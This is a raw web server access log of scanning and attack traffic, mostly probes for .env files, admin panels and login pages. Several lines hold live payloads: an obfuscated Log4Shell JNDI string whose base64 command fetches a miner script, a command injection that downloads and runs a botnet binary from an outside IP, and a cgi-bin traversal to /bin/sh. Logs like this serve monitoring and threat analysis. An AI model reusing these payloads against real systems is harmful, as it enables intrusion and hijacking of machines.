80.75.212.83 - - [09/Oct/2025:22:41:39 +0000] "GET /t%28%27$%7B$%7Benv:NaN:-j%7Dndi$%7Benv:NaN:-:%7D$%7Benv:NaN:-l%7Ddap$%7Benv:NaN:-:%7D//45.38.42.81:3389/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwczovL2Rvd25sb2FkLmMzcG9vbC5vcmcveG1yaWdfc2V0dXAvcmF3L21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBMQ19BTEw9ZW5fVVMuVVRGLTggYmFzaCAtcyA0ODZ4cXc3eXNYZEt3N1JrVnpUNXRkU2lEdEU2c294VWRZYUdhR0UxR29hQ2R2QkY3clZnNW9NWEw5cEZ4M3JCMVdVQ1pySnZkNkFITUZXaXBlWXQ1ZUZOVXg5cG1HTg==%7D%27%29 HTTP/1.1" 400 154 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//45.38.42.81:3389/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwczovL2Rvd25sb2FkLmMzcG9vbC5vcmcveG1yaWdfc2V0dXAvcmF3L21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBMQ19BTEw9ZW5fVVMuVVRGLTggYmFzaCAtcyA0ODZ4cXc3eXNYZEt3N1JrVnpUNXRkU2lEdEU2c294VWRZYUdhR0UxR29hQ2R2QkY3clZnNW9NWEw5cEZ4M3JCMVdVQ1pySnZkNkFITUZXaXBlWXQ1ZUZOVXg5cG1HTg==}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//45.38.42.81:3389/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwczovL2Rvd25sb2FkLmMzcG9vbC5vcmcveG1yaWdfc2V0dXAvcmF3L21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBMQ19BTEw9ZW5fVVMuVVRGLTggYmFzaCAtcyA0ODZ4cXc3eXNYZEt3N1JrVnpUNXRkU2lEdEU2c294VWRZYUdhR0UxR29hQ2R2QkY3clZnNW9NWEw5cEZ4M3JCMVdVQ1pySnZkNkFITUZXaXBlWXQ1ZUZOVXg5cG1HTg==}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//45.38.42.81:3389/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwczovL2Rvd25sb2FkLmMzcG9vbC5vcmcveG1yaWdfc2V0dXAvcmF3L21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBMQ19BTEw9ZW5fVVMuVVRGLTggYmFzaCAtcyA0ODZ4cXc3eXNYZEt3N1JrVnpUNXRkU2lEdEU2c294VWRZYUdhR0UxR29hQ2R2QkY3clZnNW9NWEw5cEZ4M3JCMVdVQ1pySnZkNkFITUZXaXBlWXQ1ZUZOVXg5cG1HTg==}')"
20.106.57.131 - - [09/Oct/2025:23:12:37 +0000] "GET /developmentserver/metadatauploader HTTP/1.1" 400 154 "-" "Mozilla/5.0 zgrab/0.x" "-"
23.234.92.112 - - [09/Oct/2025:23:21:25 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/129.0 (compatible; MSIE 5.01; Windows NT 5.0)" "-"
23.234.92.112 - - [09/Oct/2025:23:21:47 +0000] "GET /phpmyadmin HTTP/1.1" 400 154 "-" "Mozilla/129.0 (compatible; MSIE 5.01; Windows NT 5.0)" "-"
147.185.132.39 - - [09/Oct/2025:23:25:10 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xED\xF5G\xD2\xDB\x1A\xDA\xAD\xC5&\xD31GgD9\xD4\xEC\xE0\x93\x82\x22\x9F\xE4\xCFY\x0E\x9CD\xF2\xEB\xBA\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 150 "-" "-" "-"
147.185.132.39 - - [09/Oct/2025:23:25:10 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x09\xB0=\xAA\x0C\x90H\xB1\x9B)\xB5&f\x94\x14\x08\x82\xAE\xA0&\x89\xBF>\xBC\xCE\xBFK$H\x8C\xC6\x81 \xFB\x05`\x16>\xF5\x0C\xAA\x03\x1F\xFD\x19\xA9\x8D\xF8S\xC9\xE0+\xC8\xE1\x81B\xA5\x09\xD74\x8A\xAF\x87c&\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 150 "-" "-" "-"
185.242.226.110 - - [09/Oct/2025:23:33:41 +0000] "\x16\x03\x01\x00\x8A\x01\x00\x00\x86\x03\x03\x14;h[\xE6#\x1A^\x91\x17" 400 150 "-" "-" "-"
87.121.84.17 - - [09/Oct/2025:23:46:22 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
176.65.148.132 - - [10/Oct/2025:00:12:26 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36" "-"
176.65.148.132 - - [10/Oct/2025:00:12:26 +0000] "" 400 0 "-" "-" "-"
107.174.194.53 - - [10/Oct/2025:00:14:23 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
107.174.194.53 - - [10/Oct/2025:00:14:23 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
24.199.100.206 - - [10/Oct/2025:00:14:35 +0000] "GET /admin/config.php HTTP/1.0" 400 143 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/" "-"
209.242.203.161 - - [10/Oct/2025:00:32:06 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
209.242.203.161 - - [10/Oct/2025:00:32:06 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
102.88.54.122 - - [10/Oct/2025:00:46:38 +0000] "GET /.env HTTP/1.1" 400 154 "-" "python-requests/2.26.0" "-"
102.88.54.122 - - [10/Oct/2025:00:46:39 +0000] "POST / HTTP/1.1" 400 154 "-" "python-requests/2.26.0" "-"
93.174.93.12 - - [10/Oct/2025:00:49:26 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 150 "-" "-" "-"
167.94.138.178 - - [10/Oct/2025:01:07:14 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
167.94.138.178 - - [10/Oct/2025:01:07:15 +0000] "PRI * HTTP/2.0" 400 150 "-" "-" "-"
167.94.138.178 - - [10/Oct/2025:01:07:18 +0000] "PRI * HTTP/2.0" 400 150 "-" "-" "-"
167.94.138.178 - - [10/Oct/2025:01:07:18 +0000] "GET /.well-known/security.txt HTTP/1.1" 400 154 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
66.132.153.127 - - [10/Oct/2025:01:08:41 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
66.132.153.127 - - [10/Oct/2025:01:08:41 +0000] "PRI * HTTP/2.0" 400 150 "-" "-" "-"
66.132.153.127 - - [10/Oct/2025:01:09:15 +0000] "PRI * HTTP/2.0" 400 150 "-" "-" "-"
66.132.153.127 - - [10/Oct/2025:01:09:15 +0000] "GET /login HTTP/1.1" 400 154 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
87.121.84.17 - - [10/Oct/2025:01:41:25 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
20.169.104.27 - - [10/Oct/2025:01:53:12 +0000] "GET /hudson HTTP/1.1" 400 154 "-" "Mozilla/5.0 zgrab/0.x" "-"
170.83.199.105 - - [10/Oct/2025:01:57:07 +0000] "GET /admin/config.php HTTP/1.0" 400 143 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/" "-"
24.199.100.206 - - [10/Oct/2025:02:15:47 +0000] "GET /admin/config.php HTTP/1.0" 400 143 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/" "-"
194.163.129.51 - - [10/Oct/2025:02:28:35 +0000] "GET / HTTP/1.0" 400 143 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/" "-"
165.227.100.212 - - [10/Oct/2025:02:44:45 +0000] "GET / HTTP/1.0" 400 143 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/" "-"
216.180.246.187 - - [10/Oct/2025:03:28:39 +0000] "GET / HTTP/1.0" 400 143 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.187 - - [10/Oct/2025:03:29:24 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x81\xC9\xD1\xA5\xE6@\xF6qf\xEF[\xA8\xFC\xD6x\xF8+\x05D\x1C\xA3 \x17\xA3\xC7H\x8D\xE3\xAB\xC3\xF9\x0C Su$`C\x87Y-7\x915\xDF&u\x86\xB4n\x1E\x89\xC3s\x16\xB9b\x08>\x81\xED\x9B\x11<\x01\x00&\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-" "-"
216.180.246.187 - - [10/Oct/2025:03:30:50 +0000] "GET / HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
87.121.84.17 - - [10/Oct/2025:03:37:50 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
216.180.246.187 - - [10/Oct/2025:03:38:35 +0000] "GET /manage/account/login HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
199.45.154.151 - - [10/Oct/2025:03:41:32 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
199.45.154.151 - - [10/Oct/2025:03:41:32 +0000] "PRI * HTTP/2.0" 400 150 "-" "-" "-"
199.45.154.151 - - [10/Oct/2025:03:41:36 +0000] "PRI * HTTP/2.0" 400 150 "-" "-" "-"
199.45.154.151 - - [10/Oct/2025:03:41:36 +0000] "GET /.well-known/security.txt HTTP/1.1" 400 154 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
216.180.246.187 - - [10/Oct/2025:03:42:42 +0000] "GET /admin/index.html HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.187 - - [10/Oct/2025:03:46:29 +0000] "GET /index.html HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.187 - - [10/Oct/2025:03:50:05 +0000] "GET /+CSCOE+/logon.html HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.187 - - [10/Oct/2025:03:54:21 +0000] "GET /cgi-bin/login.cgi HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.187 - - [10/Oct/2025:03:57:28 +0000] "GET /login.htm HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
149.40.50.110 - - [10/Oct/2025:04:00:33 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/129.0 (compatible; MSIE 5.01; Windows NT 5.0)" "-"
149.40.50.110 - - [10/Oct/2025:04:00:55 +0000] "GET /phpmyadmin HTTP/1.1" 400 154 "-" "Mozilla/129.0 (compatible; MSIE 5.01; Windows NT 5.0)" "-"
216.180.246.187 - - [10/Oct/2025:04:01:10 +0000] "GET /login.html HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.187 - - [10/Oct/2025:04:05:27 +0000] "GET /login.jsp HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
196.251.117.75 - - [10/Oct/2025:04:05:56 +0000] "GET /.git/config HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 6.2; rv:19.0) Gecko/20121129 Firefox/19.0" "-"
216.180.246.187 - - [10/Oct/2025:04:09:15 +0000] "GET /login HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.187 - - [10/Oct/2025:04:12:50 +0000] "GET /doc/index.html HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.187 - - [10/Oct/2025:04:17:07 +0000] "GET /remote/login HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.187 - - [10/Oct/2025:04:20:52 +0000] "GET //admin/login.asp HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
65.49.1.52 - - [10/Oct/2025:04:23:12 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xA4)R7\x01l\x07\x98@4\xE9\xB3\xD1\xC3\xAB_\x0C!\xABT\x8C\x1Ci\xBE\x08\x10\x1A\x1A\x83ek\x0B\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-" "-"
216.180.246.187 - - [10/Oct/2025:04:24:12 +0000] "GET /web/ HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
104.253.219.169 - - [10/Oct/2025:04:27:35 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
104.253.219.169 - - [10/Oct/2025:04:27:35 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
216.180.246.187 - - [10/Oct/2025:04:28:16 +0000] "GET //webpages/login.html HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
91.227.62.213 - - [10/Oct/2025:04:31:08 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
103.252.89.75 - - [10/Oct/2025:04:57:26 +0000] "GET / HTTP/1.1" 400 154 "-" "-" "-"
91.227.62.213 - - [10/Oct/2025:04:57:50 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
138.36.155.73 - - [10/Oct/2025:05:03:50 +0000] "GET /admin/config.php HTTP/1.0" 400 143 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/" "-"
198.235.24.35 - - [10/Oct/2025:05:21:07 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\x91\xE3\x03If\xDB\xF0g\xAE@.\x97$b\x96\xDA\x01\x85\xDD\xAA\xB2'B\x8B!i\x88m\xE9\xE4M4\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 150 "-" "-" "-"
198.235.24.35 - - [10/Oct/2025:05:21:07 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x02\x88\xD6\xF5\x95\x84\x81d\xB9\xBE\xC8\x7F\xE7\x0F\xCDJ\xD6\x0F\xEF\x8D\xAB\x08\x14\x7FIH\xA3\x1C7\xB0\x8D} \x7FImT\xF1\xA8\x910\xF6\xAF\xD5i;\x18\xECf\x07\xCF\xD9hed\x94\xDA\xDA\xC0\xFA\x13H\x0F\xCA%\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 150 "-" "-" "-"
87.121.84.17 - - [10/Oct/2025:05:24:57 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
91.227.62.213 - - [10/Oct/2025:05:44:14 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
91.227.62.213 - - [10/Oct/2025:05:57:23 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
82.23.227.109 - - [10/Oct/2025:06:25:12 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
82.23.227.109 - - [10/Oct/2025:06:25:13 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
91.224.92.17 - - [10/Oct/2025:06:33:41 +0000] "GET / HTTP/1.1" 400 154 "-" "-" "-"
40.124.170.45 - - [10/Oct/2025:06:48:56 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 zgrab/0.x" "-"
87.121.84.17 - - [10/Oct/2025:07:05:25 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
204.76.203.212 - - [10/Oct/2025:07:26:56 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
43.155.195.141 - - [10/Oct/2025:07:30:22 +0000] "GET / HTTP/1.1" 200 400 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
43.165.67.57 - - [10/Oct/2025:07:34:08 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
143.244.181.47 - - [10/Oct/2025:07:35:21 +0000] "GET /admin/config.php HTTP/1.0" 400 143 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/" "-"
202.93.142.22 - - [10/Oct/2025:08:11:33 +0000] "GET /admin/config.php HTTP/1.0" 400 143 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/" "-"
182.127.191.195 - - [10/Oct/2025:08:15:25 +0000] "POST /HNAP1/ HTTP/1.0" 400 0 "-" "-" "-"
87.121.84.17 - - [10/Oct/2025:08:32:07 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
38.170.173.88 - - [10/Oct/2025:09:14:02 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
38.170.173.88 - - [10/Oct/2025:09:14:02 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
87.121.84.101 - - [10/Oct/2025:09:15:34 +0000] "GET / HTTP/1.0" 400 143 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" "-"
20.64.105.6 - - [10/Oct/2025:09:33:45 +0000] "GET /hudson HTTP/1.1" 400 154 "-" "Mozilla/5.0 zgrab/0.x" "-"
144.172.106.140 - - [10/Oct/2025:09:39:33 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 400 154 "http://3.149.120.21:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0" "-"
144.172.106.140 - - [10/Oct/2025:09:39:33 +0000] "" 400 0 "-" "-" "-"
87.121.84.17 - - [10/Oct/2025:10:30:37 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
103.252.89.75 - - [10/Oct/2025:10:38:34 +0000] "GET / HTTP/1.1" 400 154 "-" "-" "-"
54.201.41.91 - - [10/Oct/2025:11:15:44 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Linux; Android 8.0.0; moto e5 plus Build/OPPS27.91-122-3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36" "-"
140.99.206.14 - - [10/Oct/2025:11:25:14 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
140.99.206.14 - - [10/Oct/2025:11:25:15 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
144.172.116.36 - - [10/Oct/2025:11:38:46 +0000] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20boatnet.arm7%3B%20wget%20http%3A%2F%2F103.77.241.50%2Fhiddenbin%2Fboatnet.arm7%3B%20chmod%20777%20%2A%3B%20.%2Fboatnet.arm7%20tbk HTTP/1.1" 400 154 "-" "Mozilla/5.0" "-"
103.252.89.75 - - [10/Oct/2025:12:36:31 +0000] "GET / HTTP/1.1" 400 154 "-" "-" "-"
87.121.84.17 - - [10/Oct/2025:12:49:01 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
124.156.225.181 - - [10/Oct/2025:13:03:10 +0000] "GET / HTTP/1.1" 200 400 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
67.227.113.43 - - [10/Oct/2025:13:52:55 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
67.227.113.43 - - [10/Oct/2025:13:52:55 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
20.127.202.251 - - [10/Oct/2025:14:11:22 +0000] "MGLNDD_3.149.120.21_80" 400 150 "-" "-" "-"
87.121.84.101 - - [10/Oct/2025:14:13:40 +0000] "GET / HTTP/1.0" 400 143 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" "-"
43.166.247.155 - - [10/Oct/2025:14:18:51 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
87.121.84.17 - - [10/Oct/2025:14:40:37 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
88.210.63.67 - - [10/Oct/2025:15:09:16 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0" "-"
88.210.63.67 - - [10/Oct/2025:16:14:21 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 400 154 "http://3.149.120.21:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0" "-"
88.210.63.67 - - [10/Oct/2025:16:14:21 +0000] "" 400 0 "-" "-" "-"
103.252.89.75 - - [10/Oct/2025:16:32:53 +0000] "GET / HTTP/1.1" 400 154 "-" "-" "-"
87.121.84.17 - - [10/Oct/2025:16:33:34 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
209.242.203.2 - - [10/Oct/2025:16:36:58 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
209.242.203.2 - - [10/Oct/2025:16:36:59 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
185.242.226.110 - - [10/Oct/2025:16:38:54 +0000] "\x16\x03\x01\x00\x8A\x01\x00\x00\x86\x03\x03E\xF8w\xD7'-\xB3\xED\x8F\x89\xE9\xB6" 400 150 "-" "-" "-"
93.174.93.12 - - [10/Oct/2025:16:42:00 +0000] "GET / HTTP/1.0" 400 143 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )" "-"
185.247.137.43 - - [10/Oct/2025:16:43:04 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)" "-"
191.242.209.98 - - [10/Oct/2025:16:54:28 +0000] "GET /admin/config.php HTTP/1.0" 400 143 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/" "-"
192.210.160.141 - - [10/Oct/2025:17:09:02 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 150 "-" "-" "-"
